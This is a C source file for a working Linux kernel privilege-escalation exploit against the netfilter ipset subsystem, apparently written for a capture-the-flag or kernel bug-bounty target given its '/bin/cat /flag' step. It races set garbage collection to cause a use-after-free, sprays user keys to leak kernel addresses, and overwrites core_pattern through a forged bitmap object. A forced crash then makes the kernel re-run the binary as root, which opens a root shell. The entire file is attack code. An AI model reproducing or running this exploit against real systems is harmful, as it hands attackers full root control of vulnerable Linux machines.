#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/filter.h>
#include <linux/keyctl.h>
#include <linux/membarrier.h>
#include <linux/netfilter.h>
#include <linux/netfilter/ipset/ip_set.h>
#include <linux/netfilter/nfnetlink.h>
#include <linux/netfilter_ipv4/ip_tables.h>
#include <linux/rtnetlink.h>
#include <sched.h>
#include <signal.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/timerfd.h>
#include <sys/times.h>
#include <sys/wait.h>
#include <syscall.h>
#include <time.h>
#include <unistd.h>

#include "netlink.h"

typedef unsigned char u8;
typedef unsigned short u16;
typedef unsigned int u32;
typedef unsigned long long u64;

#define FAIL_IF(x) if ((x)) { perror(#x); return -1; }
#define PANIC_IF(x) if ((x)) { perror(#x); exit(errno); }

#define ARRAY_LEN(x) (sizeof(x) / sizeof((x)[0]))

static inline int _pin_to_cpu(int id)
{
  cpu_set_t set;
  CPU_ZERO(&set);
  CPU_SET(id, &set);
  return sched_setaffinity(getpid(), sizeof(set), &set);
}

u64 core_pattern = 0xffffffff83db4420;
u64 bitmap_port_type = 0xffffffff83eec040;

#define FOR_ALL_OFFSETS(x)                                                                                             \
  do {                                                                                                                 \
    x(core_pattern);                                                                                                   \
    x(bitmap_port_type);                                                                                               \
  } while (0)

static char target_core_pattern[] = "|/proc/%P/exe %P";

#define MAIN_CPU 0
#define HELPER_CPU 1
#define BUF_SIZE (1024 * 8)

#define __EVENT_SET 0
#define __EVENT_UNSET 1
#define EVENT_DEFINE(name, init) volatile int name = init
#define EVENT_WAIT(name)                                                                                               \
  while (__atomic_exchange_n(&(name), __EVENT_UNSET, __ATOMIC_ACQUIRE) != __EVENT_SET) { usleep(1000); }
#define EVENT_SET(name) __atomic_store_n(&(name), __EVENT_SET, __ATOMIC_RELEASE)

#define SPRAY_ERROR 0
#define SPRAY_RETRY 1
#define SPRAY_SUCCESS 2
volatile int status_spray = SPRAY_ERROR;

static inline u64 get_jiffies(void) { return times(NULL) * 10ULL; }

typedef int key_serial_t;

struct ip_set {
  u8 rcu[16];
  char name[IPSET_MAXNAMELEN];
  u32 lock;
  u32 ref;
  u32 ref_netlink;
  struct ip_set_type *type;
  const struct ip_set_type_variant *variant;
  u8 family;
  u8 revision;
  u8 extensions;
  u8 flags;
  u32 timeout;
  u32 elements;
  size_t ext_size;
  size_t dsize;
  size_t offset[4];
  void *data;
};
_Static_assert(sizeof(struct ip_set) == 152, "ip_set size mismatch");

struct bitmap_port {
  unsigned long *members;
  u16 first_port;
  u16 last_port;
  u32 elements;
  size_t memsize;
  unsigned long gc[5];
  struct ip_set *set;
  unsigned char extensions[];
};
_Static_assert(sizeof(struct bitmap_port) == 72, "bitmap_port size mismatch");

union key_payload {
  struct ip_set ip_set;
  struct {
    u8 header[24];
    char data[];
  } key;
};

static inline u64 __rdtsc(void)
{
  u64 result;
  asm volatile("rdtsc" : "=A"(result));
  return result;
}

static void msg_setup(struct nlmsghdr *msg, u16 cmd)
{
  struct nfgenmsg *data = NLMSG_DATA(msg);
  msg->nlmsg_len = NLMSG_HDRLEN + sizeof(*data);
  msg->nlmsg_type = (NFNL_SUBSYS_IPSET << 8) | cmd;
  msg->nlmsg_flags = NLM_F_REQUEST;
  msg->nlmsg_seq = 0;
  msg->nlmsg_pid = 0;

  data->nfgen_family = NFPROTO_IPV4;
  data->res_id = htons(NFNL_SUBSYS_IPSET);
}

static void ip_set_add_list_set(struct nlmsghdr *msg, const char *name, u32 gc_interval_sec, u32 cadt_flags)
{
  msg_setup(msg, IPSET_CMD_CREATE);
  netlink_attr_put(msg, IPSET_ATTR_SETNAME, name, strlen(name) + 1);
  netlink_attr_put(msg, IPSET_ATTR_TYPENAME, "list:set", strlen("list:set") + 1);
  {
    const u8 proto = IPSET_PROTOCOL, rev = 3, fam = NFPROTO_IPV4;
    netlink_attr_put(msg, IPSET_ATTR_PROTOCOL, &proto, sizeof(proto));
    netlink_attr_put(msg, IPSET_ATTR_REVISION, &rev, sizeof(rev));
    netlink_attr_put(msg, IPSET_ATTR_FAMILY, &fam, sizeof(fam));
  }

  struct nlattr *sd = netlink_nest_begin(msg, IPSET_ATTR_DATA);
  if (gc_interval_sec) {
    u32 timeout = htonl(3 * gc_interval_sec);
    netlink_attr_append(sd, IPSET_ATTR_TIMEOUT | NLA_F_NET_BYTEORDER, &timeout, sizeof(timeout));
  }
  if (cadt_flags) {
    u32 flags_be = htonl(cadt_flags);
    netlink_attr_append(sd, IPSET_ATTR_CADT_FLAGS | NLA_F_NET_BYTEORDER, &flags_be, sizeof(flags_be));
  }
  netlink_nest_end(msg, sd);
}

static void ip_set_add_list_set_elem(struct nlmsghdr *msg, const char *name, const char *elem, u32 timeout_sec)
{
  msg_setup(msg, IPSET_CMD_ADD);
  netlink_attr_put(msg, IPSET_ATTR_SETNAME, name, strlen(name) + 1);
  {
    const u8 proto = IPSET_PROTOCOL;
    netlink_attr_put(msg, IPSET_ATTR_PROTOCOL, &proto, sizeof(proto));
  }

  struct nlattr *sd = netlink_nest_begin(msg, IPSET_ATTR_DATA);
  netlink_attr_append(sd, IPSET_ATTR_NAME, elem, strlen(elem) + 1);
  {
    u32 t = htonl(timeout_sec);
    netlink_attr_append(sd, IPSET_ATTR_TIMEOUT | NLA_F_NET_BYTEORDER, &t, sizeof(t));
  }
  netlink_nest_end(msg, sd);
}

static void ip_set_add_bitmap_port(struct nlmsghdr *msg, const char *name, u16 from, u16 to, u32 cadt_flags)
{
  msg_setup(msg, IPSET_CMD_CREATE);
  netlink_attr_put(msg, IPSET_ATTR_SETNAME, name, strlen(name) + 1);
  netlink_attr_put(msg, IPSET_ATTR_TYPENAME, "bitmap:port", strlen("bitmap:port") + 1);
  {
    const u8 proto = IPSET_PROTOCOL, rev = 3, fam = NFPROTO_IPV4;
    netlink_attr_put(msg, IPSET_ATTR_PROTOCOL, &proto, sizeof(proto));
    netlink_attr_put(msg, IPSET_ATTR_REVISION, &rev, sizeof(rev));
    netlink_attr_put(msg, IPSET_ATTR_FAMILY, &fam, sizeof(fam));
  }

  struct nlattr *sd = netlink_nest_begin(msg, IPSET_ATTR_DATA);
  {
    u16 f = htons(from), t = htons(to);
    netlink_attr_append(sd, IPSET_ATTR_PORT | NLA_F_NET_BYTEORDER, &f, sizeof(f));
    netlink_attr_append(sd, IPSET_ATTR_PORT_TO | NLA_F_NET_BYTEORDER, &t, sizeof(t));
  }
  {
    u32 flags_be = htonl(cadt_flags);
    netlink_attr_append(sd, IPSET_ATTR_CADT_FLAGS | NLA_F_NET_BYTEORDER, &flags_be, sizeof(flags_be));
  }
  netlink_nest_end(msg, sd);
}

static void ip_set_add_bitmap_port_elem(struct nlmsghdr *msg, const char *name, u16 port, u64 counter0, u64 counter1)
{
  msg_setup(msg, IPSET_CMD_ADD);
  netlink_attr_put(msg, IPSET_ATTR_SETNAME, name, strlen(name) + 1);
  {
    const u8 proto = IPSET_PROTOCOL;
    netlink_attr_put(msg, IPSET_ATTR_PROTOCOL, &proto, sizeof(proto));
  }

  struct nlattr *sd = netlink_nest_begin(msg, IPSET_ATTR_DATA);
  {
    u16 p = htons(port);
    netlink_attr_append(sd, IPSET_ATTR_PORT | NLA_F_NET_BYTEORDER, &p, sizeof(p));
  }
  {
    u64 c0 = htobe64(counter0), c1 = htobe64(counter1);
    netlink_attr_append(sd, IPSET_ATTR_BYTES | NLA_F_NET_BYTEORDER, &c0, sizeof(c0));
    netlink_attr_append(sd, IPSET_ATTR_PACKETS | NLA_F_NET_BYTEORDER, &c1, sizeof(c1));
  }
  netlink_nest_end(msg, sd);
}

static void ip_set_del_bitmap_port_elem(struct nlmsghdr *msg, const char *name, u16 port)
{
  msg_setup(msg, IPSET_CMD_DEL);
  netlink_attr_put(msg, IPSET_ATTR_SETNAME, name, strlen(name) + 1);
  {
    const u8 proto = IPSET_PROTOCOL;
    netlink_attr_put(msg, IPSET_ATTR_PROTOCOL, &proto, sizeof(proto));
  }

  struct nlattr *sd = netlink_nest_begin(msg, IPSET_ATTR_DATA);
  {
    u16 p = htons(port);
    netlink_attr_append(sd, IPSET_ATTR_PORT | NLA_F_NET_BYTEORDER, &p, sizeof(p));
  }
  netlink_nest_end(msg, sd);
}

static int send_check(int fd, struct nlmsghdr *msg, u32 total_len)
{
  if (total_len > BUF_SIZE) {
    fprintf(stderr, "message too large: %u\n", total_len);
    abort();
  }
  FAIL_IF(__netlink_send(fd, msg, total_len) < 0);
  FAIL_IF(netlink_recv(fd, msg, BUF_SIZE) < 0);
  return netlink_errno(msg);
}

static void synchronize_rcu(void)
{
  if (syscall(__NR_membarrier, MEMBARRIER_CMD_GLOBAL, 0, -1) < 0) { perror("membarrier()"); }
}

#define IPSET_EXT_COMMENT 4
#define IPSET_EXT_ID_COMMENT 3

static u8 *scratch_buf_try_trigger_bug = NULL;
static u8 *scratch_buf_spray_fake_set = NULL;
static void *try_trigger_bug_stack = NULL;
static void *spray_fake_set_stack = NULL;

EVENT_DEFINE(trigger_bug, __EVENT_UNSET);

int try_trigger_bug(void *arg)
{
  (void) arg;
  EVENT_WAIT(trigger_bug);
  _pin_to_cpu(MAIN_CPU);

  int nfd;
  FAIL_IF((nfd = netlink_open(NETLINK_NETFILTER)) < 0);
  int tfd;
  FAIL_IF((tfd = timerfd_create(CLOCK_MONOTONIC, 0)) < 0);

  struct itimerspec it;
  memset(&it, 0, sizeof(it));

  u32 total_len = 0;
  struct nlmsghdr *msg = (struct nlmsghdr *) scratch_buf_try_trigger_bug;
  memset(scratch_buf_try_trigger_bug, 0, BUF_SIZE);

  char list_set_name[3] = { '!', 'A', '\0' };
  for (int j = 0; j < 10; j++) {
    list_set_name[1] = 'A' + j;
    ip_set_add_list_set(msg, list_set_name, 1, 0);
    total_len += msg->nlmsg_len;
    msg = nlmsg_end(msg);
  }

  for (int i = 0; i < 1; i++) {
    char name[3] = { 0 };
    snprintf(name, sizeof(name), "%x", i);

    ip_set_add_bitmap_port(msg, name, 9999, 9999, 0);
    total_len += msg->nlmsg_len;
    msg = nlmsg_end(msg);

    for (int j = 0; j < 10; j++) {
      list_set_name[1] = 'A' + j;
      ip_set_add_list_set_elem(msg, list_set_name, name, 1);
      total_len += msg->nlmsg_len;
      msg = nlmsg_end(msg);
    }
  }

  it.it_value.tv_nsec = 960ULL * 1000000ULL;
  FAIL_IF(timerfd_settime(tfd, 0, &it, NULL) < 0);

  if (send_check(nfd, (void *) scratch_buf_try_trigger_bug, total_len) != 0) {
    perror("netlink_send()");
    return -1;
  }
  _pin_to_cpu(HELPER_CPU);

  close(nfd);

  u64 tmp;
  read(tfd, &tmp, sizeof(tmp));

  exit(0);
}

int spray_fake_set(void *arg)
{
  status_spray = SPRAY_ERROR;
  int notify_fd = *(int *) arg;

  int bug_worker_pid =
      clone(try_trigger_bug, try_trigger_bug_stack, CLONE_NEWUSER | CLONE_NEWNET | CLONE_VM | SIGCHLD, NULL);
  FAIL_IF(bug_worker_pid < 0);

  FAIL_IF(unshare(CLONE_NEWUSER | CLONE_NEWNET | CLONE_NEWNS) < 0);

  union key_payload payload;
  memset(&payload, '?', sizeof(payload));
  union key_payload readout;
  memset(&readout, 0, sizeof(readout));

  const size_t payload_size = sizeof(payload.ip_set) - sizeof(payload.key.header);
  key_serial_t keys[256];
  memset(keys, 0, sizeof(keys));

  struct itimerspec it;
  memset(&it, 0, sizeof(it));

  int tfd;
  FAIL_IF((tfd = timerfd_create(CLOCK_MONOTONIC, 0)) < 0);

  payload.ip_set.extensions = IPSET_EXT_COMMENT;
  payload.ip_set.offset[IPSET_EXT_ID_COMMENT] = 32;

  EVENT_SET(trigger_bug);

  _pin_to_cpu(MAIN_CPU);

  FAIL_IF(waitpid(bug_worker_pid, NULL, 0) < 0);

  struct timespec t0;
  clock_gettime(CLOCK_MONOTONIC, &t0);

  u64 tmp;
  it.it_value.tv_nsec = 50ULL * 1000000ULL;
  FAIL_IF(timerfd_settime(tfd, 0, &it, NULL) < 0);
  read(tfd, &tmp, sizeof(tmp));

  struct timespec t1;
  clock_gettime(CLOCK_MONOTONIC, &t1);

  u64 begin = get_jiffies();

  do {
    for (int i = 0; i < 128; i++) {
      u64 _t0 = __rdtsc();
      while ((__rdtsc() - _t0) < 1000ULL) {}

      if (keys[i]) { FAIL_IF(keyctl(KEYCTL_UPDATE, keys[i], (unsigned long) &payload.key.data, payload_size, 0) < 0); }
      else {
        char desc[16];
        snprintf(desc, sizeof(desc), "-%d", i);
        key_serial_t id =
            syscall(__NR_add_key, "user", desc, &payload.key.data, payload_size, KEY_SPEC_PROCESS_KEYRING);
        FAIL_IF(id < 0);
        keys[i] = id;
      }
    }

    synchronize_rcu();

    for (int i = 0; i < 128; i++) {
      FAIL_IF(keyctl(KEYCTL_READ, keys[i], (unsigned long) &readout.key.data, payload_size, 0) < 0);

      if (readout.ip_set.ext_size != 0x3f3f3f3f3f3f3f3fULL) {
        printf("race success: key = %d!\n", keys[i]);
        key_serial_t k = keys[i];
        int nfd;
        FAIL_IF((nfd = netlink_open(NETLINK_NETFILTER)) < 0);
        synchronize_rcu();

        struct nlmsghdr *msg;
        u32 total_len;
        int name_idx = 0;
        char list_set_name[12 + 4 + 1] = { '\1', '\1', 'P', 'P', 'P', 'P', 'P', 'P', '$', '$', '$', '$' };

        while (1) {
          total_len = 0;
          msg = (void *) scratch_buf_spray_fake_set;
          memset(scratch_buf_spray_fake_set, 0, BUF_SIZE);

          for (int j = 0; j < 16; j++) {
            snprintf(&list_set_name[12], 5, "%04x", name_idx++);
            ip_set_add_bitmap_port(msg, list_set_name, 9000, 9000, IPSET_FLAG_WITH_COUNTERS);
            total_len += msg->nlmsg_len;
            msg = nlmsg_end(msg);
          }
          FAIL_IF(send_check(nfd, (void *) scratch_buf_spray_fake_set, total_len) != 0);

          FAIL_IF(keyctl(KEYCTL_READ, k, (unsigned long) &readout.key.data, 0x0101, 0) < 0);

          if (!strncmp("$$$$", &readout.ip_set.name[8], 4)) {
            printf("successfully reclaimed key with set object (sprayed %d sets)!\n", name_idx);
            printf("  leaked bitmap_port_type: %p\n", readout.ip_set.type);
            printf("  leaked data: %p\n", readout.ip_set.data);
            break;
          }
          if (name_idx >= 0xFFFF) {
            printf("failed to reclaim object!\n");
            abort();
          }
        }

        u64 diff = (u64) readout.ip_set.type - bitmap_port_type;
#define SHIFT_OFFSETS(x)                                                                                               \
  {                                                                                                                    \
    x += diff;                                                                                                         \
  }
        FOR_ALL_OFFSETS(SHIFT_OFFSETS);
#undef SHIFT_OFFSETS

        total_len = 0;
        msg = (void *) scratch_buf_spray_fake_set;
        memset(scratch_buf_spray_fake_set, 0, BUF_SIZE);

        strcpy(&list_set_name[8], &readout.ip_set.name[8]);
        printf("target set: %s\n", list_set_name);

        const struct bitmap_port fake = { .members = (void *) core_pattern,
                                          .first_port = 0,
                                          .last_port = (u16) (sizeof(target_core_pattern) * 8),
                                          .elements = 0 };

        const u64 *counters = (const u64 *) &fake;
        ip_set_add_bitmap_port_elem(msg, list_set_name, 9000, counters[0], counters[1]);
        total_len += msg->nlmsg_len;
        msg = nlmsg_end(msg);

        FAIL_IF(send_check(nfd, (void *) scratch_buf_spray_fake_set, total_len) != 0);

        FAIL_IF(keyctl(KEYCTL_REVOKE, k, 0, 0, 0) < 0);
        synchronize_rcu();

        memcpy(&payload, &readout, sizeof(readout));

        strcpy(payload.ip_set.name, (void *) &payload_size);

        payload.ip_set.data = (char *) payload.ip_set.data + sizeof(struct bitmap_port);

        while (1) {
          for (int j = 0; j < 128; j++) {
            if (j == i) continue;
            if (keys[j]) {
              if (keyctl(KEYCTL_UPDATE, keys[j], (unsigned long) &payload.key.data, payload_size, 0) < 0) {
                perror("keyctl()");
                keys[j] = 0;
              }
            }
          }

          int failure = 0;
          for (int byte = 0; byte < (int) sizeof(target_core_pattern) && !failure; byte++) {
            for (int bit = 0; bit < 8; bit++) {
              total_len = 0;
              msg = (void *) scratch_buf_spray_fake_set;
              memset(scratch_buf_spray_fake_set, 0, BUF_SIZE);

              if ((target_core_pattern[byte] >> bit) & 1) {
                ip_set_add_bitmap_port_elem(msg, (void *) &payload_size, byte * 8 + bit, ~0ULL, ~0ULL);
              }
              else {
                ip_set_del_bitmap_port_elem(msg, (void *) &payload_size, byte * 8 + bit);
              }
              msg->nlmsg_flags |= NLM_F_ACK;
              total_len += msg->nlmsg_len;
              msg = nlmsg_end(msg);

              int err = send_check(nfd, (void *) scratch_buf_spray_fake_set, total_len);
              if (err == -ENOENT) {
                failure = 1;
                break;
              }
              if (err < 0 && err != -IPSET_ERR_EXIST) {
                perror("bitmap add/del elem");
                return -1;
              }
            }
          }
          if (!failure) {
            printf("spray succeeded!\n");
            FAIL_IF(write(notify_fd, "x", 1) < 0);
            while (1) sleep(1000);
          }
          usleep(500);
        }
      }
    }
  } while (get_jiffies() - begin < 400ULL);

  struct timespec t2;
  clock_gettime(CLOCK_MONOTONIC, &t2);
  printf("stop spraying : %lu.%lu\n", t2.tv_sec, t2.tv_nsec);

  status_spray = SPRAY_RETRY;
  return 0;
}

int main(int argc, char *argv[])
{
  if (!getuid()) {
    pid_t pid = (pid_t) strtoul(argv[1], NULL, 10);
    int pfd = syscall(SYS_pidfd_open, pid, 0);
    int stdinfd = syscall(SYS_pidfd_getfd, pfd, 0, 0);
    int stdoutfd = syscall(SYS_pidfd_getfd, pfd, 1, 0);
    int stderrfd = syscall(SYS_pidfd_getfd, pfd, 2, 0);
    dup2(stdinfd, 0);
    dup2(stdoutfd, 1);
    dup2(stderrfd, 2);

    char *shell[] = { "/bin/sh", "-c", "/bin/cat /flag && /bin/sh", NULL };
    execve(shell[0], shell, NULL);
    return 0;
  }

  printf("Hello World!\n");

  int pipefds[2];
  FAIL_IF(pipe(pipefds));
  int fault_worker = fork();
  FAIL_IF(fault_worker < 0);
  if (!fault_worker) {
    close(pipefds[1]);
    char buf[1];
    FAIL_IF(read(pipefds[0], buf, 1) < 0);
    asm volatile("xor %rax, %rax; movq $0, (%rax);");
    return 0;
  }
  close(pipefds[0]);

  scratch_buf_spray_fake_set = calloc(BUF_SIZE, 1);
  FAIL_IF(!scratch_buf_spray_fake_set);
  scratch_buf_try_trigger_bug = calloc(BUF_SIZE, 1);
  FAIL_IF(!scratch_buf_try_trigger_bug);

  try_trigger_bug_stack = mmap(NULL, 0x8000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
  FAIL_IF(try_trigger_bug_stack == MAP_FAILED);
  try_trigger_bug_stack += 0x8000;

  spray_fake_set_stack = mmap(NULL, 0x8000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
  FAIL_IF(spray_fake_set_stack == MAP_FAILED);
  spray_fake_set_stack += 0x8000;

  do {
    int spray_worker_pid = clone(spray_fake_set, spray_fake_set_stack, CLONE_VM | SIGCHLD, &pipefds[1]);
    FAIL_IF(spray_worker_pid < 0);
    FAIL_IF(waitpid(spray_worker_pid, NULL, 0) < 0);

  } while (status_spray == SPRAY_RETRY);

  if (status_spray == SPRAY_ERROR) { return -1; }

  write(pipefds[1], "x", 1);
  return 0;
}
